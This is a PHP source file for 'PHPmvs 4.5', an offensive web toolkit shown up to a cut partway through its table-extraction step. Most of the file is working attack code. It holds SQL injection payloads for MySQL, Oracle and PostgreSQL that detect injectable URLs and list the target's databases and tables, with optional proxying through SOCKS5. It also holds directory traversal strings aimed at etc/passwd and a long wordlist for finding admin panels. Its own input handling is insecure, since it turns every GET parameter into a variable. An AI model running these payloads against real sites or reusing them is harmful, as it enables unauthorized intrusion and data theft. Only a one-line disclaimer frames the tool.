<?php
/* 
By Diego Cardenas "The Samedog" under the GNU GENERAL PUBLIC LICENSE Version 2, June 1991 e-mail: the.samedog[at]gmail.com.
*/
$soft_ver="4.5";

$disclaimer = "Usage of this script for attacking websites WITHOUT permission of the owner is illegal. Developer is not responsible for any damage caused by this.";

//most queries are modded sqlmap generated queries http://sqlmap.sourceforge.net/
set_time_limit(0);
error_reporting(0);

//common functions

function char_looping($char,$end,$loops){
	$return_string = "";
	
	for($x = 0; $x < $loops; $x++){
		$return_string = $return_string.$char;
		$return_array[] = $return_string.$end;
	}
	return $return_array;
}

//dummy queries to print ":oyu:" if the url is injectable.
$payload_union   = "CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)";
$payload_error   = "(SELECT+8041+FROM(SELECT+COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT+(CASE+WHEN+(8041%3D8041)+THEN+1+ELSE+0+END)),0x3a70687a3a,floor(rand(0)%2A2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)";
$payload_oracle  = "(SELECT+(CASE+WHEN+(1=1)+THEN+1+ELSE+0+END)+FROM+DUAL)";
$payload_postgre = "(SELECT+(CASE+WHEN+(2=2)+THEN+1+ELSE+0+END))";

//Oracle error based
$c = array(
    '+AND+3456=(SELECT+UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(121)||CHR(117)||CHR(58)||' . $payload_oracle . '||CHR(58)||CHR(112)||CHR(104)||CHR(122)||CHR(58)||CHR(62)))+FROM+DUAL)'
);

//postgre error based
$d = array(
    '+AND+1=CAST((CHR(58)||CHR(111)||CHR(121)||CHR(117)||CHR(58))||' . $payload_postgre . '::text||(CHR(58)||CHR(112)||CHR(104)||CHR(122)||CHR(58))+AS+NUMERIC)',
    '\'+AND+1=CAST((CHR(58)||CHR(111)||CHR(121)||CHR(117)||CHR(58))||' . $payload_postgre . '::text||(CHR(58)||CHR(112)||CHR(104)||CHR(122)||CHR(58))+AS+NUMERIC)+AND+\'123\'=\'123'
);

// MySQL (and MsSql???) error-based queries array
$a = array(
    '%27+AND+' . $payload_error . '+AND+%27MEpR%27%3D%27MEpR',
    '%27)+AND+' . $payload_error . '+AND+(%27ffAM%27%3D%27ffAM',
    '+AND+' . $payload_error . '',
    ')+AND+' . $payload_error . '+AND+(7609%3D7609'
	//'%27+AND+' . $payload_error . '+AND+%27qkSk%27%3D%27qkSk'
);

//shitload of UNION queries array (up to 20 columns) now as a loop

function create_union_queries($payload_union){
    //ok, shit happens
    for($x = 0; $x <= 20; $x++){
        //null
        $null_str=str_repeat('NULL,', $x).'NULL';
        $numeric_str=str_repeat('1,', $x).'1';
        for($z = 0; $z <= $x; $z++){
            $null_array=explode(',', $null_str);
            $null_array[$z]="$payload_union";
            
            $numeric_array=explode(',', $numeric_str);
            $numeric_array[$z]="$payload_union";

            $return[]="+union+all+select+".implode(',',$null_array)."%23";
            $return[]="+union+all+select+".implode(',',$numeric_array)."%23";

            $return[]="+666-union+all+select+".implode(',',$null_array)."%23";
            $return[]="+666-union+all+select+".implode(',',$numeric_array)."%23";


            $return[]="%27+666-union+all+select+".implode(',',$null_array)."%23";
            $return[]="%27+666-union+all+select+".implode(',',$numeric_array)."%23";

            $return[]="+-666%27+union+all+select+".implode(',',$null_array)."%23";
            $return[]="+-666%27+union+all+select+".implode(',',$numeric_array)."%23";

        }
        
    }
    //return array_merge($return_null,$return_numeric,$return_numericsc,$return_scnumeric);
    return $return;
}
$b = create_union_queries($payload_union);

//mysql_errors_array
$error_messages=array(
    "m"=>"MySQL","m1"=>"mysql","m2"=>"DB Error: invalid number","m3"=>"mysql_fetch_array()","m4"=>"MySQL","m5"=>"supplied argument is not a valid MySQL","You have an error in your SQL syntax;",
	"m6"=>"You have an error in your SQL syntax near","m7"=>"MySQL server version for the right syntax to use","m8"=>"on MySQL result index","m9"=>"mysql_fetch",
	"m10"=>"DB Error: unknown error", "m11"=>"mysql_fetch_array()","m12"=>"mysqli_()",
    "o"=>"Oracle","o2"=>"ORA-","o3"=>"ora-","o4"=>"ORA-00",
	"p1"=>"PostgreSQL","p2"=>"pg_query","p3"=>"unterminated quoted string","p4"=>"pg_exec","p5"=>"PostgreSQL query failed:","p6"=>"not a valid PostgreSQL result"
);

//directory traversal array


$dt = array_merge(char_looping('../',"etc/passwd",10),char_looping('..%2F',"etc/passwd",10),char_looping('%2E%2E%2F',"etc%2Fpasswd",10 ));


//admin panel common locations... array, i'm really thinking into remove this or maybe "deprecate" it.
$ap = array(
	'backend/',
    'admin.php',
    'login.htm',
    'login.html',
    'login/',
    'login.php',
    'adm/',
    'admin/',
    'admin/account.html',
    'admin/login.html',
    'admin/login.htm',
    'admin/home.php',
    'admin/controlpanel.html',
    'admin/controlpanel.htm',
    'admin/cp.php',
    'admin/adminLogin.html',
    'admin/adminLogin.htm',
    'admin/admin_login.php',
    'admin/controlpanel.php',
    'admin/admin-login.php',
    'admin-login.php',
    'admin/account.php',
    'admin/admin.php',
    'admin.htm',
    'admin.html',
    'adminitem/',
    'adminitem.php',
    'adminitems/',
    'adminitems.php',
    'administrator/',
    'administrator/login.php',
    'administrator.php',
    'administration/',
    'administration.php',
    'adminLogin/',
    'adminlogin.php',
    'admin_area/admin.php',
    'admin_area/',
    'admin_area/login.php',
    'manager/',
    'manager.php',
    'letmein/',
    'letmein.php',
    'superuser/',
    'superuser.php',
    'access/',
    'access.php',
    'sysadm/',
    'sysadm.php',
    'superman/',
    'supervisor/',
    'panel.php',
    'control/',
    'control.php',
    'member/',
    'member.php',
    'members/',
    'members.php',
    'user/',
    'user.php',
    'cp/',
    'uvpanel/',
    'manage/',
    'manage.php',
    'management/',
    'management.php',
    'signin/',
    'signin.php',
    'log-in/',
    'log-in.php',
    'log_in/',
    'log_in.php',
    'sign_in/',
    'sign_in.php',
    'sign-in/',
    'sign-in.php',
    'users/',
    'users.php',
    'accounts/',
    'accounts.php',
    'wp-login.php',
    'bb-admin/login.php',
    'bb-admin/admin.php',
    'bb-admin/admin.html',
    'administrator/account.php',
    'relogin.htm',
    'relogin.html',
    'check.php',
    'relogin.php',
    'blog/wp-login.php',
    'user/admin.php',
    'users/admin.php',
    'registration/',
    'processlogin.php',
    'checklogin.php',
    'checkuser.php',
    'checkadmin.php',
    'isadmin.php',
    'authenticate.php',
    'authentication.php',
    'auth.php',
    'authuser.php',
    'authadmin.php',
    'cp.php',
    'modelsearch/login.php',
    'moderator.php',
    'moderator/',
    'controlpanel/',
    'controlpanel.php',
    'admincontrol.php',
    'adminpanel.php',
    'fileadmin/',
    'fileadmin.php',
    'sysadmin.php',
    'admin1.php',
    'admin1.html',
    'admin1.htm',
    'admin2.php',
    'admin2.html',
    'yonetim.php',
    'yonetim.html',
    'yonetici.php',
    'yonetici.html',
    'phpmyadmin/',
    'myadmin/',
    'ur-admin.php',
    'ur-admin/',
    'Server.php',
    'Server/',
    'wp-admin/',
    'administr8.php',
    'administr8/',
    'webadmin/',
    'webadmin.php',
    'administratie/',
    'admins/',
    'admins.php',
    'administrivia/',
    'Database_Administration/',
    'useradmin/',
    'sysadmins/',
    'admin1/',
    'system-administration/',
    'administrators/',
    'pgadmin/',
    'directadmin/',
    'staradmin/',
    'ServerAdministrator/',
    'SysAdmin/',
    'administer/',
    'LiveUser_Admin/',
    'sys-admin/',
    'typo3/',
    'panel/',
    'cpanel/',
    'cpanel_file/',
    'platz_login/',
    'rcLogin/',
    'blogindex/',
    'formslogin/',
    'autologin/',
    'support_login/',
    'meta_login/',
    'manuallogin/',
    'simpleLogin/',
    'loginflat/',
    'utility_login/',
    'showlogin/',
    'memlogin/',
    'login-redirect/',
    'sub-login/',
    'wp-login/',
    'login1/',
    'dir-login/',
    'login_db/',
    'xlogin/',
    'smblogin/',
    'customer_login/',
    'UserLogin/',
    'login-us/',
    'acct_login/',
    'bigadmin/',
    'project-admins/',
    'phppgadmin/',
    'pureadmin/',
    'sql-admin/',
    'radmind/',
    'openvpnadmin/',
    'wizmysqladmin/',
    'vadmind/',
    'ezsqliteadmin/',
    'hpwebjetadmin/',
    'newsadmin/',
    'adminpro/',
    'Lotus_Domino_Admin/',
    'bbadmin/',
    'vmailadmin/',
    'Indy_admin/',
    'ccp14admin/',
    'irc-macadmin/',
    'banneradmin/',
    'sshadmin/',
    'phpldapadmin/',
    'macadmin/',
    'administratoraccounts/',
    'admin4_account/',
    'admin4_colon/',
    'radmind-1/',
    'Super-Admin/',
    'AdminTools/',
    'cmsadmin/',
    'SysAdmin2/',
    'globes_admin/',
    'cadmins/',
    'phpSQLiteAdmin/',
    'navSiteAdmin/',
    'server_admin_small/',
    'logo_sysadmin/',
    'power_user/',
    'system_administration/',
    'ss_vms_admin_sm/',
    'bb-admin/',
    'panel-administracion/',
    'instadmin/',
    'memberadmin/',
    'administratorlogin/',
    'adm.php',
    'admin_login.php',
    'panel-administracion/login.php',
    'pages/admin/admin-login.php',
    'pages/admin/',
    'acceso.php',
    'admincp/login.php',
    'admincp/',
    'adminarea/',
    'admincontrol/',
    'affiliate.php',
    'adm_auth.php',
    'memberadmin.php',
    'administratorlogin.php',
    'modules/admin/',
    'administrators.php',
    'siteadmin/',
    'siteadmin.php',
    'adminsite/',
    'kpanel/',
    'vorod/',
    'vorod.php',
    'vorud/',
    'vorud.php',
    'adminpanel/',
    'PSUser/',
    'secure/',
    'webmaster/',
    'webmaster.php',
    'autologin.php',
    'userlogin.php',
    'admin_area.php',
    'cmsadmin.php',
    'security/',
    'usr/',
    'root/',
    'secret/',
    'admin/login.php',
    'admin/adminLogin.php',
    'moderator.php',
    'moderator.html',
    'moderator/login.php',
    'moderator/admin.php',
    'yonetici.php',
    '0admin/',
    '0manager/',
    'aadmin/',
    'cgi-bin/loginphp',
    'login1php',
    'login_admin/',
    'login_adminphp',
    'login_out/',
    'login_outphp',
    'login_userphp',
    'loginerror/',
    'loginok/',
    'loginsave/',
    'loginsuper/',
    'loginsuperphp',
    'loginphp',
    'logout/',
    'logoutphp',
    'secrets/',
    'super1/',
    'super1php',
    'super_indexphp',
    'super_loginphp',
    'supermanagerphp',
    'supermanphp',
    'superuserphp',
    'supervise/',
    'supervise/Loginphp',
    'superphp',
    'fw-panel'
);


//--------------------------------------------------------------------------------------------------------------
//frames part were taken from phpFileManager http://phpfm.sourceforge.net/
//because i was too fucking lazy to code it myself.
foreach ($_GET as $key => $val)
    $$key = htmldecode($val);
switch (@$frame) {
    case 1:
        frame1();
        break;
    case 2:
        frame2();
        break;
    case 3:
        frame3();
        break;
    case 4:
        frame4();
        break;
    case 6:
        frame5();
        break;
    case 15:
        frame6();
        break;
    case 7:
        framemvs1();
        break;
    case 8:
        framemvs2();
        break;
    //deleted		case 9: PHPsvc();break; 
    case 10:
        PHPps_frame();
        break;
    case 11:
        PHPapf_frame();
        break;
    case 12:
        PHPswc_frame();
        break;
    case 13:
        PHPfuz_frame();
        break;
    case 14:
        PHPdt_frame();
        break;
    //deleted		case 15: PHPjvs_frame();break; working on a better joomla scanner
    default:
        switch (@$action) {
            default:
                PHPmvs_frame();
        }
}


//--------------------------------------------------------------------------------------------------------------



$string3 = ':oyu:'; //if this exist in the site, we have found the right injection URI.


function htmldecode($str)
{
    if (is_string($str)) {
        return html_entity_decode($str);
    } else
        return $str;
}
function html_header($plus = "")
{
    echo "
		<html>
		<head>
		<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">
		$plus
		 <style>
			body {
				font-family : Arial;
				font-weight : normal;
				color: green;
				background-color: black;
				font-size: 12px;
			}
			form {
				font-size: 12px;
			}table {
				font-size: 12px;
			}
			</style>
		</head>";
}

//------------------------------------------------------------------------------------------------------------------
//Functions for queries and stuffs

//find wich method is available, if none, you are REALLY fucked :c
function get_url($url,$proxy){
	if(function_exists('curl_version')==true){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		if ($proxy != 0 or $proxy != "" or $proxy != NULL){
			curl_setopt($ch, CURLOPT_PROXY, "socks5://".$proxy);
		}
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$output = curl_exec($ch);
		curl_close($ch);
		return $output;
	}
	elseif(file_get_contents($url)){//HA!!
		return file_get_contents($url);
	}
	else{
		echo "No way found to fetch an url, stopping";
		exit();
	}
}

function get_server_info($theURL)
{
    //because fuck you
    $headers = get_headers($theURL, 1);
    $p       = parse_url($theURL);
    $info    = "SERVER INFO:<br>";
    foreach ($p as $key => $value) {
        $info = $info . $key . ": " . $value . "<br>";
    }
    foreach ($headers as $key => $value) {
        $info = $info . $key . ": " . $value . "<br>";
    }
    return $info;
}
function hexEncode($str)
{
    //best way to get table names without fucking up the query in the ass = HEX ENCODE
    if (is_null($str)) {
        return FALSE;
    }
    $hexStr = "";
    for ($i = 0; isset($str[$i]); $i++) {
        $char = dechex(ord($str[$i]));
        $hexStr .= $char;
    }
    return "0x" . $hexStr;
}
function asciiEncode($str)
{
    //because you are lame and can't read hex and the table names are in hex because of the HEX ENCODE
    if (!preg_match("/^0x[A-Fa-f0-9]+/", $str)) {
        return FALSE;
    }
    $str         = substr($str, 2);
    $asciiString = "";
    for ($i = 0; isset($str[$i]); $i += 2) {
        $hexChar = substr($str, $i, 2);
        $asciiString .= chr(hexdec($hexChar));
    }
    return $asciiString;
}
function GetBetween($content)
{
    //this reads the data from the injected url
    $r = explode(":oyu:", $content);
    if (isset($r[1])) {
        $r = explode(":phz:", $r[1]);
        return $r[0];
    }
    return '';
}

//from ascii to CHR(XX)
function CHRize($value)
{
    $awe = 0;
    while ($awe < strlen($value)) {
        $value2[$awe] = "CHR(" . ord($value[$awe]) . ")";
        $awe++;
    }
    $value2 = implode('||', $value2);
    return $value2;
}

///////////////////////////// FRAMES ///////////////////////////////////

function PHPmvs_frame()
{
    //"Title screen"
    html_header();
    echo "<frameset cols=\"20%,*\" framespacing=\"0\" frameborder=\"0\">
	<frame src=\"" . $_SERVER['PHP_SELF'] . "?frame=7\" name=frame6 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
	<frame src=\"" . $_SERVER['PHP_SELF'] . "?frame=8\" name=frame7 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
	</frameset>
	</body></html>";
}
function framemvs1()
{
    //left menu
    global $action;
    html_header();
    echo "
	<div>Impressive Logo Goes HERE!</div>
	<br><br><br><br><br><br>
	<div>
	<br>
	<div onclick=\"javascript:top.frames['frame7'].location.href='" . $_SERVER['PHP_SELF'] . "?frame=6'\">SQL Vulnerability sCanner</div>
	<br>
	<div onclick=\"javascript:top.frames['frame7'].location.href='" . $_SERVER['PHP_SELF'] . "?frame=10'\">Port Scanner</div>
	<br>
	<div onclick=\"javascript:top.frames['frame7'].location.href='" . $_SERVER['PHP_SELF'] . "?frame=11'\">Admin Panel finder</div>
	<br>
	<div onclick=\"javascript:top.frames['frame7'].location.href='" . $_SERVER['PHP_SELF'] . "?frame=12'\">Simple Web Crawler</div>
	<br>
	<div onclick=\"javascript:top.frames['frame7'].location.href='" . $_SERVER['PHP_SELF'] . "?frame=13'\">Simple Server Fuzzer</div>
	<br>
	<div onclick=\"javascript:top.frames['frame7'].location.href='" . $_SERVER['PHP_SELF'] . "?frame=14'\">Directory Traversal</div>
	<br>
	</div>

	";
}
function framemvs2()
{
    //main frame
    global $action, $disclaimer,$soft_ver;
    html_header();
    echo "<h1>PHPmvs $soft_ver</h1>
	 <div>
	 <br><b><h4></size>DIS-FUCKING-CLAIMER: " . $disclaimer . "</h4></b><br>
	Usage: <br>
	1. Select module from left menu. <br>
	2. Follow the instructions<br>
	3. ???????<br>
	4. PROFIT!.
	</div><br><br><div>Rewriting lots of code, optimizing arrays, making loops for iterations and lot of other shit";
}

///////PHPsic starts------------------------------------------------------------
function frameset()
{
    html_header();
    echo "
    <frameset rows=\"*,25%\" framespacing=\"0\" frameborder=\"0\">
			<frame src=\"" . $_SERVER['PHP_SELF'] . "?frame=1\" name=frame1 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
	    <frameset cols=\"33%,*,33%\" framespacing=\"0\" frameborder=\"0\">
            <frame src=\"" . $_SERVER['PHP_SELF'] . "?frame=2\" name=frame2 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
        <frame src=\"" . $_SERVER['PHP_SELF'] . "?frame=3\" name=frame3 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
			<frame src=\"" . $_SERVER['PHP_SELF'] . "?frame=4\" name=frame4 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
        </frameset>
       </frameset>
       </html>";
}
function frame1()
{
    global $string3, $mode_eb, $a, $b, $c, $d, $error_messages,$s5_ip, $s5_port, $action, $proxy;
    html_header();
    
    echo "<body>\n
	<div align=left><h1>PHPsic</h1></div><br>
	<br>Paste url (format: http://www.example.com/something.php?bla=something)<br>
	Select desired mode/injection<br>
	Let the data flow<br><br><br>
	<table><tr><td>
	<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=1\" method=\"post\" name=\"forma\" id=\"forma\">
	url: <input type=\"text\" name=\"url\" id=\"url\" size=\"65\" value=\"http://\"/>
	<input type=\"submit\" name=\"forma\" id=\"form\" value=\"search\"/><br>
	<input type=\"checkbox\" name=\"checkerror\" id=\"checkerror\" value=\"check_e\" checked>Test for Error-based ||
	<input type=\"checkbox\" name=\"checknion\" id=\"checknion\" value=\"check\"> Test for UNION query (slow) ||
	<input type=\"checkbox\" name=\"speed\" id=\"speed\" value=\"speed\" checked> Fast scan (show only first injection point per vulnerability)
	<br><br>
	<div>
	Socks 5 proxy (optional, only if Curl is available).<br>
	<pre>
IP:   <input type=\"text\" name=\"s5_ip\" id=\"s5_ip\" size=\"15\"/>
Port: <input type=\"text\" name=\"s5_port\" id=\"s5_port\" size=\"5\"/>
	</pre
	</div>
	</form> 
	";
    if (isset($_POST['forma']) && $_POST['forma'] == 'search') {
        $url = $_POST["url"];
		//are we dealing with a multi-parameter url?
        if (strpos($url, "&") == true) {
            echo "<b>Multiple parameter url detected</b><br/>";
        }
        $check   = @$_POST["checknion"];
        $checke  = @$_POST["checkerror"];
        $break   = @$_POST["speed"];
        $s5_ip   = @$_POST["s5_ip"];
        $s5_port  = @$_POST["s5_port"];
        //i suck at names... and coding
        if ($s5_port != "" and $s5_port != NULL){
			$proxy="$s5_ip:$s5_port";
		}else{
			$proxy=0;
		}
        
        //echo "<br><div align=\"left\">" . get_server_info($url) . "</div>";
        $eurl_a   = explode("&", $url);
        $ea       = "0";
        $ef       = count($eurl_a);
        $final    = array();
        $final[0] = $eurl_a[0];
        while ($ea < $ef) {
            $sobras = explode($eurl_a[$ea], $url);
            $url2   = str_replace($sobras[1], "", $url);
            
            //some sort of "heuristic" starts...
            $payload  = $url2 . "+and+1=1" . $sobras[1];
            $payload2 = $url2 . "+and+1=2" . $sobras[1];
            $payload3 = $url2 . "'" . $sobras[1];
            
            $url_s  = get_url($payload,$proxy);
            $url_s2 = get_url($payload2,$proxy);
            $url_s3 = get_url($payload3,$proxy);

            if (md5($url_s) != md5($url_s2) or md5($url_s3) != md5($url)) {
                foreach($error_messages as $key=>$value){
					if (strpos($url_s, $value) or strpos($url_s2, $value) or strpos($url_s3, $value)){
						$type = $key;
						$type = preg_replace('/[0-9]+/', '', $type);
						if ($break == 'speed') {
							break;
						}
					}else{
					$type = "u";
					}
				}
			}
			if ($type == "m" or $type == "u") {
				if ($checke == 'check_e') { // mysql error based detection
					$as = 1;
					foreach ($a as $detectar) {
						echo "."; //LOL "progress bar"		
						$payload = $url2.$detectar.$sobras[1];
						$html = get_url($payload,$proxy);
						if (strpos($html, $string3)) {
							$mode_eb = $as;
							echo "<div><font color=blue>Detected: MySQL error based injection =)</font> <br>URL:  <font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar</font></div>
								<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=2\" method=\"post\" target=\"frame2\" name=\"database\" id=\"database\">
								<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url2\"/>
								<input type=\"hidden\" name=\"sobras\" id=\"sobras\" value=\"$sobras[1]\"/>
								<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$mode_eb\"/>
								<input type=\"submit\" name=\"database\" id=\"database\" value=\"Get e-b\"/>
								</form> <br/>
								";
							$eb_i = 1;
							if ($break == 'speed') {
								break;
							}
						}
						$as++;
					}
				}
					
					if ($check == 'check') { //mysql union based detection
						$ass = 1;
						foreach ($b as $detectar2) {
							echo "."; //LOL "progress bar"
							$payload = $url2 . $detectar2 . $sobras[1];
							$html8   = get_url($payload,$proxy);
							if (strpos($html8, $string3)) {
								$mode_uq = $ass;
								echo "<div><font color=blue>Detected: MySQL UNION query injection =)</font><br>URL:<font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar2</font></div>
								<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=2\" method=\"post\" target=\"frame2\" name=\"database\" id=\"database\">
								<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url2\"/>
								<input type=\"hidden\" name=\"sobras\" id=\"sobras\" value=\"$sobras[1]\"/>
								<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$mode_uq\"/>
								<input type=\"submit\" name=\"database\" id=\"database\" value=\"Get u-q\"/>
								</form> <br/>
								";
								$uq_i = 1;
								if ($break == 'speed') {
									break;
								}
							}
							$ass++;
						}
					}
				}
				if ($type == "o" or $type == "u") {
					if ($checke == 'check_e') { //oracle error based detection
						$asd = 1;
						foreach ($c as $detectar) {
							echo "."; //LOL "progress bar"
							$html = get_url($url2 . $detectar . $sobras[1],$proxy);
							if (strpos($html, $string3) == true) {
								$mode_oeb = $asd;
								echo "<div><font color=blue>Detected: Oracle error based injection =)</font> <br>URL:  <font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar</font></div>
								<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=2\" method=\"post\" target=\"frame2\" name=\"database\" id=\"database\">
								<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url2\"/>
								<input type=\"hidden\" name=\"sobras\" id=\"sobras\" value=\"$sobras[1]\"/>
								<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$mode_oeb\"/>
								<input type=\"submit\" name=\"database\" id=\"database\" value=\"Get o-eb\"/>
								</form> <br/>
								";
								$oc_i = 1;
								if ($break == 'speed') {
									break;
								}
							}
							$asd++;
						}
					}
				}
				if ($type == "p" or $type == "u") {
					if ($checke == 'check_e') { //posgre error based detection
						$asdf = 1;
						foreach ($d as $detectar) {
							echo "."; //LOL "progress bar"
							$html = get_url("$url2+$detectar+$sobras[1]",$proxy);
							if (strpos($html, $string3) == true) {
								$mode_pg = $asdf;
								echo "<div><font color=blue>Detected: PostgreSQL error based injection =)</font> <br>URL:  <font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar</font></div>
									<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=2\" method=\"post\" target=\"frame2\" name=\"database\" id=\"database\">
									<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url2\"/>
									<input type=\"hidden\" name=\"sobras\" id=\"sobras\" value=\"$sobras[1]\"/>
									<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$mode_pg\"/>
									<input type=\"submit\" name=\"database\" id=\"database\" value=\"Get pg\"/>
									</form> <br/>
									";
								$pg = 1;
								if ($break == 'speed') {
									break;
								}
							}
							$asdf++;
						}
					}
				}
            //some sort of heuristic ends
            $ea++;
        }
        if (($eb_i == 0) and ($uq_i == 0) and ($oc_i == 0) and ($pg == 0)) {
            echo "<div><br><font color=red>No injection point detected =(</font> Try unchecking \"Fast scan\"</div><br><br>";
        } //no shit Sherlock.
    }
    echo "</body>\n</html>";
}
function frame2()
{
    html_header();
    global $string3;
    global $action, $detectar_t;
    global $a, $payload_error, $b, $payload_union, $c, $payload_oracle, $d, $payload_postgre;
    if (isset($_POST['database'])) {
        echo "select database...";
        $url        = $_POST["url"];
        $vuln_index = $_POST["lol"];
        $sobras     = $_POST['sobras'];
        if ($_POST['database'] == 'Get e-b') {
            $mode   = "mysql_error";
            $query  = $a[$vuln_index - 1];
            $querys = str_replace("$payload_error", "(SELECT+3830+FROM(SELECT+COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT+MID((IFNULL(CAST(COUNT(%2A)+AS+CHAR),0x20)),1,50)+FROM+INFORMATION_SCHEMA.SCHEMATA),0x3a70687a3a,FLOOR(RAND(0)%2A2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)", $query);
        } elseif ($_POST['database'] == 'Get u-q') {
            $mode   = "mysql_union";
            $query  = $b[$vuln_index - 1];
            $querys = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", "CONCAT(0x3a6f79753a,IFnull(CAST(COUNT(%2A)+AS+CHAR),0x20),0x3a70687a3a)", $query);
            $querys = str_replace("%23", "+FROM+INFORMATION_SCHEMA.SCHEMATA%23", $querys);
        } elseif ($_POST['database'] == 'Get o-eb') {
            $mode  = "oracle_error";
            $query = $c[$vuln_index - 1];
        } elseif ($_POST['database'] == 'Get pg') {
            $mode  = "postgre_error";
            $query = $d[$vuln_index - 1];
        }
        echo "
			<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=3\" target=\"frame3\" method=\"post\" name=\"columnas\" id=\"columnas\">
			<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url\"/>
			<input type=\"hidden\" name=\"sobras\" id=\"sobras\" value=\"$sobras\"/>
			<select name=\"nombre\" id=\"nombre\">";
        if ($mode == "mysql_error") {
            $queryn   = str_replace("$payload_error", '(SELECT+7288+FROM(SELECT+COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT+MID((IFNULL(CAST(schema_name+AS+CHAR),0x20)),1,50)+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+$i,1),0x3a70687a3a,floor(rand(0)%2A2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)', $query);
            $i        = 0;
            $count    = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $tablasss = "tables e-b";
        } elseif ($mode == "mysql_union") {
            $queryn   = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", 'CONCAT(0x3a6f79753a,IFnull(CAST(SCHEMA_NAME+AS+CHAR),0x20),0x3a70687a3a)', $query);
			$queryn   = str_replace("%23", '+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+$i,1%23', $queryn);
            $i        = 0;
            $count    = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $tablasss = "tables u-q";
        } elseif ($mode == "oracle_error") {
            $queryn   = str_replace("$payload_oracle", "(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(USER%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20DUAL)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))", $query);
            $tablasss = "tables o-eb";
            $i        = 0;
            $count    = 0;
        } elseif ($mode == "postgre_error") {
            $tablasss = "tables pg";
        }
        if ($mode == "postgre_error") {
            echo "<option value=\"public\">public</option>";
        } else {
            while ($i <= $count) {
                //echo $count;
                $query_nombre = str_replace('$i', "$i", $queryn);
                $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
				if($nombre=="" || $nombre==null && $mode == "mysql_union"){
					$querys = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", "CONCAT(0x3a6f79753a,database(),0x3a70687a3a)", $query);
					$query_nombre = str_replace("%23", "+FROM+INFORMATION_SCHEMA.SCHEMATA%23", $querys);
					$nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
					echo "<option value=\"" . $nombre . "\">$nombre</option>";
					break;
				}else{
					echo "<option value=\"" . $nombre . "\">".$nombre."</option>";
					$i++;
				}
            }
        }
        echo "</select>
			<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$vuln_index\"/>
			<input type=\"submit\" name=\"tablas\" id=\"tablas\" value=\"$tablasss\"/>
			</form>";
    }
}

function frame3()
{
    html_header();
    global $string3;
    global $action, $detectar_t;
    global $a, $payload_error, $b, $payload_union, $c, $payload_oracle, $d, $payload_postgre;
    if (isset($_POST['tablas'])) {
        echo "select table...";
        $database   = $_POST['nombre'];
        $url        = $_POST["url"];
        $vuln_index = $_POST["lol"];
        $sobras     = $_POST['sobras'];
        if ($_POST['tablas'] == 'tables e-b') {
            $database = hexEncode($database);
            $mode     = "mysql_error";
            $query    = $a[$vuln_index - 1];
            $querys   = str_replace("$payload_error", "(SELECT%203830%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(COUNT(%2A)%20AS%20CHAR),0x20)),1,50)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20$database%20),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)", $query);
        } elseif ($_POST['tablas'] == 'tables u-q') {
            $database = hexEncode($database);
            $mode     = "mysql_union";
            $query    = $b[$vuln_index - 1];
            $querys   = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", "CONCAT(0x3a6f79753a,IFnull(CAST(COUNT(%2A)%20AS%20CHAR),0x20),0x3a70687a3a)", $query);
